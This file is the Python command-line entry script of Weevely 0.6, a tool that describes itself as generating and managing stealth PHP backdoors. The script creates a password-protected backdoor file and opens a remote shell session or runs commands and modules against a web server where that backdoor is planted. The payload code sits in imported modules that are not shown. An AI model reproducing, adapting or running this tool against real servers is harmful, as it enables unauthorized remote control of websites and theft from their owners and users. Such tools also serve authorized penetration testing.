#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


from core.terminal import Terminal, module_trigger, help_string
from core.backdoor import Backdoor
from core.modules_handler import ModHandler
from core.module import ModuleException
from core.helper import Helper

import sys
    
print '''
Weevely 0.6 - Generate and manage stealth PHP backdoors
              Emilio Pinna 2011-2012            
'''
   
general_usage = '''Start telnet-like session
  weevely <url> <password> 
  
Run single command or module
  weevely <url> <password> <command> [argument1] [argument2] ..

Generate PHP backdoor script
  weevely generate <password> <output path> 
  
Show modules help
  weevely <url> <password> %s [module name]
'''  % help_string
    
if __name__ == "__main__":

    
    if  len(sys.argv) == 3 and sys.argv[1].startswith('http'):
        
        print "[+] Starting terminal. Shell probe may take a while..."
        
        url = sys.argv[1]
        password = sys.argv[2]
          
        try:
            Terminal ( ModHandler( url, password ) ).loop()
        except ModuleException, e:
            print e
        except KeyboardInterrupt:
            print '\n[!] Exiting. Bye ^^'
        
    elif len(sys.argv) == 4 and sys.argv[1] == 'generate':
        try:
         Backdoor( sys.argv[2] ).save( sys.argv[3] )
        except Exception, e:
            print '\n[!] Creation error: %s ' % str(e)
            raise
        
    elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):

        url = sys.argv[1]
        password = sys.argv[2]        
        
        
        if sys.argv[3] == help_string:
            modname = ''
            if len(sys.argv)>4:
                modname = sys.argv[4]
            print ModHandler(url, password).helps(modname)
            
        else:
        
            try:
                terminal = Terminal (ModHandler(url, password), True)
                
                if sys.argv[3][0] == module_trigger:
                    terminal.run_module_cmd(sys.argv[3:])
                else:
                    terminal.run_line_cmd(' '.join(sys.argv[3:]))
                
            except ModuleException, e:
                print e
            except KeyboardInterrupt:
                print '\n[!] Exiting. Bye ^^'
    else:
        
        print '%s\nAvailable modules\n\n%s\n' % (general_usage, Helper().summaries())
        
    
